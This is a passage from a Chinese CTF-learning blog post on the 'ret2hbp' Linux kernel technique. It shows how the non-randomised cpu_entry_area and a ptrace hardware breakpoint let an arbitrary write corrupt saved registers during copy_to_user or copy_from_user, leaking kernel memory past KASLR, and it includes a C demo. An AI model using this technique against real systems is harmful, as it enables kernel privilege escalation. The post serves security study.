<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ret2hbp</title>
    <link href="/2024/01/29/ret2hbp/"/>
    <url>/2024/01/29/ret2hbp/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在一切之前"><a href="#0x00：写在一切之前" class="headerlink" title="0x00：写在一切之前"></a>0x00：写在一切之前</h1><p>终于磕磕绊绊到kernel了，感慨万千呜呜😭😭😭</p><p>希望能在这classic的美学中有所收获吧</p><p>起初是👴啃了两个礼拜A3👴的博客，想找点题练练手，就去做了SCTF2023那几道kernel题，于是便有了ret2hbp的学习手记</p><h1 id="0x01：what-is-ret2hbp？"><a href="#0x01：what-is-ret2hbp？" class="headerlink" title="0x01：what is ret2hbp？"></a>0x01：what is ret2hbp？</h1><p>首先我们假设有一个very nice的任意地址写，有以下几个buff😀</p><ul><li>无限次数</li><li>能长时间存在</li><li>长度任意可控</li></ul><p>看起来十分白给，but还没有泄露kalsr，所以一些常规的攻击手法8是很行的通呜呜</p><p>于是，我们首先要干的事情是leak一些好康的东西出来。</p><p>在<strong>Linux x86-64</strong>体系结构下，处理特定中断和异常的过程中，CPU会跳转到相应的栈并记录当前的寄存器内容。这些栈被定位在一个固定的、未进行随机化的虚拟地址空间中，每种中断或异常都对应不同的栈。这些栈位于一个名为<code>struct cpu_entry_area</code>的结构体字段内。</p><p>关于<code>struct cpu_entry_area</code>的静态和非随机化位置，我们可以通过查看Linux内核的实现来了解其具体位置。具体来讲，内核通过<code>get_cpu_entry_area()</code>函数来访问这个结构体的位置。这个函数负责提供对应的地址，让系统能够定位到这个特定区域。</p><p>这边采用的是5.11.0版本的kernel</p><p>以下分析内容来源于此<a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">一种借助硬件断点的提权思路分析与演示 (veritas501.github.io)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">noinstr <span class="hljs-keyword">struct</span> cpu_entry_area *<span class="hljs-title function_">get_cpu_entry_area</span><span class="hljs-params">(<span class="hljs-type">int</span> cpu)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> va = CPU_ENTRY_AREA_PER_CPU + cpu * CPU_ENTRY_AREA_SIZE;<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cpu_entry_area) % PAGE_SIZE != <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> cpu_entry_area *) va;<br>&#125;<br></code></pre></td></tr></table></figure><p>笔者实在是懒，具体数值是多少👴也8想算了，直接gdb里看了</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240201212227.png" style="zoom:50%;" /><p>于是乎，在5.11.0中，0xfffffe0000001000便是这个结构体的固定地址</p><p>处理中断时所用的栈位于<code>struct cpu_entry_area</code>结构体内的<code>estacks</code>字段中。这个字段包含了用于中断栈表（<code>Interrupt Stack Table</code>，简称IST）的栈，为不同类型的中断和异常提供了专用的栈空间。通过这种方式，Linux确保在处理中断和异常时，能够安全地切换栈空间，同时保留当前的寄存器状态，这些栈被设计为位于一个预定的、非随机化的虚拟地址空间，以便于访问和管理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Exception stacks used for IST entries with guard pages.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cea_exception_stacks</span> <span class="hljs-title">estacks</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在<code>struct cea_exception_stacks</code>中针对每一种类型都有对应的栈：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ESTACKS_MEMBERS(guardsize, optional_stack_size)\</span><br><span class="hljs-meta">charDF_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDF_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charNMI_stack_guard[guardsize];\</span><br><span class="hljs-meta">charNMI_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charDB_stack_guard[guardsize];\</span><br><span class="hljs-meta">charDB_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charMCE_stack_guard[guardsize];\</span><br><span class="hljs-meta">charMCE_stack[EXCEPTION_STKSZ];\</span><br><span class="hljs-meta">charVC_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC_stack[optional_stack_size];\</span><br><span class="hljs-meta">charVC2_stack_guard[guardsize];\</span><br><span class="hljs-meta">charVC2_stack[optional_stack_size];\</span><br><span class="hljs-meta">charIST_top_guard[guardsize];\</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">/* The exception stacks&#x27; physical storage. No guard pages required */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exception_stacks</span> &#123;</span><br>ESTACKS_MEMBERS(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>这些栈主要用于在从用户模式切换到内核模式的过程中，以及在内核模式下处理异常情况。它们通过<code>tss_setup_ist()</code>函数注册到相应的中断栈表（IST）项中，以确保在遇到特定的中断或异常时，系统能够正确地使用这些预设的栈进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tss_setup_ist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tss_struct *tss)</span><br>&#123;<br><span class="hljs-comment">/* Set up the per-CPU TSS IST stacks */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_DF] = __this_cpu_ist_top_va(DF);<br>tss-&gt;x86_tss.ist[IST_INDEX_NMI] = __this_cpu_ist_top_va(NMI);<br>tss-&gt;x86_tss.ist[IST_INDEX_DB] = __this_cpu_ist_top_va(DB);<br>tss-&gt;x86_tss.ist[IST_INDEX_MCE] = __this_cpu_ist_top_va(MCE);<br><span class="hljs-comment">/* Only mapped when SEV-ES is active */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_VC] = __this_cpu_ist_top_va(VC);<br><br></code></pre></td></tr></table></figure><p>在x86-64架构下，中断栈表（IST，Interrupt Stack Table）包含了7个每个CPU特有的条目，用于处理包括双重故障（Double Fault）、非屏蔽中断（NMI）、调试（DEBUG）等在内的特定中断类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The index for the tss.ist[] array. The hardware limit is 7 entries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DF0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_NMI1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DB2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_MCE3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_VC4</span><br></code></pre></td></tr></table></figure><p>在这5种特定中断中，由于在用户模式下利用ptrace设置硬件断点能够激活DEBUG中断，硬件断点的触发不仅可以在用户空间实现，也能在内核空间进行。这使得通过硬件断点引发的中断成为了后期应用中最优选项。</p><p>DEBUG对应的处理函数为<code>asm_exc_debug()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">const</span> __initconst <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> <span class="hljs-title">def_idts</span>[] =</span> &#123;<br>.........<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>INTG(X86_TRAP_DB,asm_exc_debug),<br>.........<br>&#125;;<br></code></pre></td></tr></table></figure><p>具体实现为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C">DEFINE_IDTENTRY_DEBUG(exc_debug)<br>&#123;<br>exc_debug_kernel(regs, debug_read_clear_dr6());<br>&#125;<br><br><span class="hljs-comment">/* User entry, runs on regular task stack */</span><br>DEFINE_IDTENTRY_DEBUG_USER(exc_debug)<br>&#123;<br>exc_debug_user(regs, debug_read_clear_dr6());<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/* 32 bit does not have separate entry points. */</span><br>DEFINE_IDTENTRY_RAW(exc_debug)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dr6 = debug_read_clear_dr6();<br><br><span class="hljs-keyword">if</span> (user_mode(regs))<br>exc_debug_user(regs, dr6);<br><span class="hljs-keyword">else</span><br>exc_debug_kernel(regs, dr6);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就可以愉快的写个demo啦</p><p>首先便是设置一个已知内存地址的硬件断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>被<code>ptrace</code>跟踪的子进程可以通过以下两种途径激活硬件断点：当在用户空间触发硬件断点时，将会调用<code>exc_debug_user()</code>函数进行处理；相反，若是在执行类似<code>uname()</code>这样的函数，其中涉及<code>copy_from/to_user()</code>操作时触发硬件断点，则会调用<code>exc_debug_kernel()</code>函数进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE1(uname, <span class="hljs-keyword">struct</span> old_utsname __user *, name)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_utsname</span> <span class="hljs-title">tmp</span>;</span><br><br><span class="hljs-keyword">if</span> (!name)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>down_read(&amp;uts_sem);<br><span class="hljs-built_in">memcpy</span>(&amp;tmp, utsname(), <span class="hljs-keyword">sizeof</span>(tmp));<br>up_read(&amp;uts_sem);<br><span class="hljs-keyword">if</span> (copy_to_user(name, &amp;tmp, <span class="hljs-keyword">sizeof</span>(tmp)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">if</span> (override_release(name-&gt;release, <span class="hljs-keyword">sizeof</span>(name-&gt;release)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (override_architecture(name))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>组合一下（👴本来想用内联汇编中的syscall_uname，这样就能很清楚的看寄存器的值，结果发现这样好像断不住呜呜）</p><p>PS：由于<code>cpu_entry_area</code>是per-cpu的，所以要绑个CPU，调试的时候换绑不同的CPU发现DEBUG Exception stack完全不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-type">char</span> data[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid_hbp;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    <br>    pid_hbp = fork();<br>    <span class="hljs-keyword">if</span> (!pid_hbp)<br>    &#123;<br>        ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        <span class="hljs-comment">// __asm__(</span><br>        <span class="hljs-comment">// &quot;mov r15,   0x11111111;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r14,   0x22222222;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r13,   0x33333333;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r12,   0x44444444;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbp,   0x55555555;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbx,   0x66666666;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r11,   0x77777777;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r10,   0x88888888;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r9,    0x99999999;&quot;   </span><br>        <span class="hljs-comment">// &quot;mov r8,    0xaaaaaaaa;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   0xbbbbbbbb;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rcx,   0xcccccccc;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdx,   0xdddddddd;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rsi,   data;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdi,   [rsi];&quot;</span><br>        <span class="hljs-comment">// // &quot;mov qword ptr [rdi], 1;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   63;&quot;</span><br>        <span class="hljs-comment">// &quot;syscall;&quot;</span><br>        <span class="hljs-comment">// );</span><br>        uname((<span class="hljs-type">void</span> *)data);<br>        <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    create_hbp(pid_hbp, data);<br><br>    ptrace(PTRACE_CONT,pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>打个断点在<code>exc_debug_kernel</code>上（👴不知道为什么👴不能用<code>b exc_debug_kernel</code>直接break，只能用源码+line才能break）</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202125518.png" style="zoom:50%;" /><p>运行demo，观看寄存器发现确实<code>ip</code>断在copy_to_user中，在这个上下文中，<code>di</code>寄存器作为目标用户空间地址，而<code>si</code>寄存器则代表源自内核空间的地址，数据从<code>si</code>拷贝至<code>di</code>。拷贝操作以每次8字节的方式逐步执行，<code>cx</code>寄存器记录了剩余需要拷贝的次数。值得注意的是，在硬件断点触发时，<code>rep movs</code>指令已经执行了一轮拷贝，即已经处理了8字节的数据。</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130307.png" style="zoom:50%;" /><p>而这个regs参数，正处于<code>struct cpu_entry_area</code>中的 <code>DEBUG Exception stack</code>中：</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130731.png" style="zoom:50%;" /><p>因此，<code>regs.cx</code>在未知内核地址空间布局随机化（KASLR）的情况下，成为了一个极佳的攻击目标。</p><p>进一步探讨<code>uname</code>函数调用的情况，我们发现<code>copy_to_user</code>函数操作的数据源自一个位于内核栈上的临时对象：</p><p>在<code>copy_to_user</code>操作进行时，如果另一个进程通过任意地址写在被攻击（victim）进程的硬件断点中断处理期间更改了<code>regs.cx</code>的值，当中断处理结束，执行流重新进入<code>copy_to_user</code>时，由于<code>cx</code>寄存器的值已被篡改，将会导致向用户态缓冲区拷贝额外的内容。这便有了leak dirty data的机会惹。</p><p>相同的，既然在copy_to_user的时候可以hack rcx，那么在copy_from_user的时候同样也可以，增加复制长度，将构造好的数据出传入进去。p0 blog里就选用了一个prctl的子函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">prctl_set_mm_map</span><span class="hljs-params">(<span class="hljs-type">int</span> opt, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_size)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">prctl_map</span> =</span> &#123; .exe_fd = (u32)<span class="hljs-number">-1</span>, &#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_auxv[AT_VECTOR_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br><span class="hljs-type">int</span> error;<br><br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(user_auxv) != <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv));<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map) &gt; <span class="hljs-number">256</span>);<br><br><span class="hljs-keyword">if</span> (opt == PR_SET_MM_MAP_SIZE)<br><span class="hljs-keyword">return</span> put_user((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-keyword">sizeof</span>(prctl_map),<br>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __user *)addr);<br><br><span class="hljs-keyword">if</span> (data_size != <span class="hljs-keyword">sizeof</span>(prctl_map))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;prctl_map, addr, <span class="hljs-keyword">sizeof</span>(prctl_map)))<br><span class="hljs-keyword">return</span> 